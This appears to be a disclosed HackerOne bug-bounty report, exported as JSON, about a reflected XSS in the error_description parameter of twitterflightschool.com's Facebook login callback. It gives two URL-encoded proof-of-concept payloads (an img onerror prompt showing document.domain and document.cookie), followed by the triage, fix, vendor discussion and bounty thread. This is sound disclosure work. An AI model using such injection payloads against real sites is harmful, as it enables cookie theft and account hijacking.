{"id":770349,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzAzNDk=","url":"https://hackerone.com/reports/770349","title":"Reflected XSS in twitterflightschool.com","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2020-01-08T17:42:07.205Z","submitted_at":"2020-01-08T17:42:07.205Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jubabaghdad","url":"/jubabaghdad","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/163/869/81e430b406e2fdb84b5ff8134cd9a87f99e159d6_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-21T20:26:38.914Z","bug_reporter_agreed_on_going_public_at":"2020-01-31T21:12:29.963Z","team_member_agreed_on_going_public_at":"2020-02-21T20:26:38.838Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"While testing twitterflightschool.com, I came across the below endpoint:\n\nhttps://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026error_code=200\u0026error_description=\n\nI noticed that it is possible to inject JS payload in \"error_description=\" parameter and trigger XSS in twitterflightschool.com\n\n\nReproduction Steps:\n==============\n\nHere we go\nhttps://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026error_code=200\u0026error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E\n\nhttps://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026error_code=200\u0026error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E\n\n## Impact\n\nThis is will allow the attacker to steal users cookies","vulnerability_information_html":"\u003cp\u003eWhile testing twitterflightschool.com, I came across the below endpoint:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026amp;error_code=200\u0026amp;error_description=\" href=\"/redirect?url=https%3A%2F%2Ftwitterflightschool.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026amp;error_code=200\u0026amp;error_description=\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI noticed that it is possible to inject JS payload in \u0026quot;error_description=\u0026quot; parameter and trigger XSS in twitterflightschool.com\u003c/p\u003e\n\n\u003ch1 id=\"reproduction-steps\"\u003eReproduction Steps:\u003c/h1\u003e\n\n\u003cp\u003eHere we go\u003cbr\u003e\n\u003ca title=\"https://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026amp;error_code=200\u0026amp;error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E\" href=\"/redirect?url=https%3A%2F%2Ftwitterflightschool.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3D%2522%253E%253Cimg%2Bsrc%253Dx%2Bonerror%253Dprompt%2528document.domain%2529%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026amp;error_code=200\u0026amp;error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026amp;error_code=200\u0026amp;error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E\" href=\"/redirect?url=https%3A%2F%2Ftwitterflightschool.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3D%2522%253E%253Cimg%2Bsrc%253Dx%2Bonerror%253Dprompt%2528document.cookie%2529%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitterflightschool.com/authentication/fb_callback?error=access_denied\u0026amp;error_code=200\u0026amp;error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis is will allow the attacker to steal users cookies\u003c/p\u003e\n","bounty_amount":"1120.0","formatted_bounty":"$1,120","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-01T21:12:30.072Z","allow_singular_disclosure_after":-26127405.44963965,"singular_disclosure_allowed":true,"vote_count":131,"voters":["a_d_a_m","ibruteforce","v0lck3r","base_64","mik317","johndoe1492","0xelkomy","mygf","nullware","ceph1","and 121 more..."],"severity":{"rating":"none","score":0.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":1070,"asset_type":"URL","asset_identifier":"twitterflightschool.com","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6722530,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your report @jubabaghdad,\n\nWe were able to reproduce the behavior you described and will get back to you when we have more information.\n\nThank you for thinking of Twitter security.","markdown_message":"\u003cp\u003eThank you for your report \u003ca href=\"/jubabaghdad\"\u003e@jubabaghdad\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe were able to reproduce the behavior you described and will get back to you when we have more information.\u003c/p\u003e\n\n\u003cp\u003eThank you for thinking of Twitter security.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-09T03:21:00.156Z","updated_at":"2020-01-09T03:21:00.156Z","actor":{"username":"bugtriage-sophia","cleared":false,"url":"/bugtriage-sophia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6728860,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-09T17:14:55.371Z","updated_at":"2020-01-09T17:14:55.371Z","actor":{"username":"asayler","cleared":false,"url":"/asayler","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/395/70da753edd29b342a463a7ef9c2e75cb22ce35d8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6740705,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T22:15:47.881Z","updated_at":"2020-01-10T22:15:47.881Z","actor":{"username":"asayler","cleared":false,"url":"/asayler","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/395/70da753edd29b342a463a7ef9c2e75cb22ce35d8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jubabaghdad","url":"/jubabaghdad"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6740777,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @asayler \n\nYes I can confirm it is fixed for me, I will appreciate if you don't disclose this right now cause some companies still vulnerable too and I am waiting for their fix too until I ask for disclose.\n\nThanks,\nSarmad Hassan\n@JubaBaghdad","markdown_message":"\u003cp\u003eHi \u003ca href=\"/asayler\"\u003e@asayler\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eYes I can confirm it is fixed for me, I will appreciate if you don\u0026#39;t disclose this right now cause some companies still vulnerable too and I am waiting for their fix too until I ask for disclose.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSarmad Hassan\u003cbr\u003e\n\u003ca href=\"/jubabaghdad\"\u003e@JubaBaghdad\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T22:29:59.970Z","updated_at":"2020-01-10T22:29:59.970Z","actor":{"username":"jubabaghdad","cleared":false,"url":"/jubabaghdad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/869/81e430b406e2fdb84b5ff8134cd9a87f99e159d6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6740853,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks, @jubabaghdad. We don't generally disclose reports unless the report requests it, so we'll sit on this unless you want it disclosed.\n\nAs it seems you are aware, twitterflightschool .com is actully powered by a third party LMS. I believe that LMS vendor has fixed this issue across all their customer installs, but have you been in touch with them directly?","markdown_message":"\u003cp\u003eThanks, \u003ca href=\"/jubabaghdad\"\u003e@jubabaghdad\u003c/a\u003e. We don\u0026#39;t generally disclose reports unless the report requests it, so we\u0026#39;ll sit on this unless you want it disclosed.\u003c/p\u003e\n\n\u003cp\u003eAs it seems you are aware, twitterflightschool .com is actully powered by a third party LMS. I believe that LMS vendor has fixed this issue across all their customer installs, but have you been in touch with them directly?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T22:47:46.332Z","updated_at":"2020-01-10T22:47:46.332Z","actor":{"username":"asayler","cleared":false,"url":"/asayler","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/395/70da753edd29b342a463a7ef9c2e75cb22ce35d8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6740867,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @asayler\nI contact the vendor \"Intellum\" through their support email but unfortunately I didn't get any reply from them, other companies who use the same service were already reported by me, regarding the bounty issue, I know it is Ineligible for reward but instead I decided to inform you, it is not about the money always, it is about doing something good to the community.\n\nThanks,\nSarmad Hassan\n@jubabaghdad ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/asayler\"\u003e@asayler\u003c/a\u003e\u003cbr\u003e\nI contact the vendor \u0026quot;Intellum\u0026quot; through their support email but unfortunately I didn\u0026#39;t get any reply from them, other companies who use the same service were already reported by me, regarding the bounty issue, I know it is Ineligible for reward but instead I decided to inform you, it is not about the money always, it is about doing something good to the community.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSarmad Hassan\u003cbr\u003e\n\u003ca href=\"/jubabaghdad\"\u003e@jubabaghdad\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-10T22:53:02.697Z","updated_at":"2020-01-10T22:53:02.697Z","actor":{"username":"jubabaghdad","cleared":false,"url":"/jubabaghdad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/869/81e430b406e2fdb84b5ff8134cd9a87f99e159d6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6895258,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for helping us keep Twitter safe and secure for our users!","markdown_message":"\u003cp\u003eThanks again for helping us keep Twitter safe and secure for our users!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-28T21:33:06.730Z","updated_at":"2020-01-28T21:33:06.730Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"1120.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"jubabaghdad","url":"/jubabaghdad"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6897118,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you so much guys for the bounty actually to you make me speechless, but may I know why you decided to reward me with this bounty since as I know the site is Ineligible for bounty!\n\nThanks,\nSarmad Hassan","markdown_message":"\u003cp\u003eThank you so much guys for the bounty actually to you make me speechless, but may I know why you decided to reward me with this bounty since as I know the site is Ineligible for bounty!\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSarmad Hassan\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-29T07:45:16.614Z","updated_at":"2020-01-29T07:45:16.614Z","actor":{"username":"jubabaghdad","cleared":false,"url":"/jubabaghdad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/869/81e430b406e2fdb84b5ff8134cd9a87f99e159d6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6925284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jubabaghdad, while you are correct that we do not generally pay bounties for this domain, in this case we appreciate you taking the time to bring this issue to our attention despite the lack of response from the underlying vendor. So we opted to reward a discretionary bounty to show our appreciation. Thank you for helping to keep Twitter secure.","markdown_message":"\u003cp\u003e\u003ca href=\"/jubabaghdad\"\u003e@jubabaghdad\u003c/a\u003e, while you are correct that we do not generally pay bounties for this domain, in this case we appreciate you taking the time to bring this issue to our attention despite the lack of response from the underlying vendor. So we opted to reward a discretionary bounty to show our appreciation. Thank you for helping to keep Twitter secure.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-30T23:33:22.360Z","updated_at":"2020-01-30T23:33:22.360Z","actor":{"username":"asayler","cleared":false,"url":"/asayler","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/395/70da753edd29b342a463a7ef9c2e75cb22ce35d8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6936521,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @asayler\nThanks again for your generosity, let's disclose this to the community, let them see how great you are guys.\n\nThanks,\nSarmad Hassan\n@jubabaghdad ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/asayler\"\u003e@asayler\u003c/a\u003e\u003cbr\u003e\nThanks again for your generosity, let\u0026#39;s disclose this to the community, let them see how great you are guys.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSarmad Hassan\u003cbr\u003e\n\u003ca href=\"/jubabaghdad\"\u003e@jubabaghdad\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T21:12:29.992Z","updated_at":"2020-01-31T21:12:29.992Z","first_to_agree":true,"actor":{"username":"jubabaghdad","cleared":false,"url":"/jubabaghdad","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/869/81e430b406e2fdb84b5ff8134cd9a87f99e159d6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7116391,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-21T20:26:38.855Z","updated_at":"2020-02-21T20:26:38.855Z","actor":{"username":"began","cleared":false,"url":"/began","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7116392,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-02-21T20:26:38.933Z","updated_at":"2020-02-21T20:26:38.933Z","actor":{"username":"began","cleared":false,"url":"/began","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}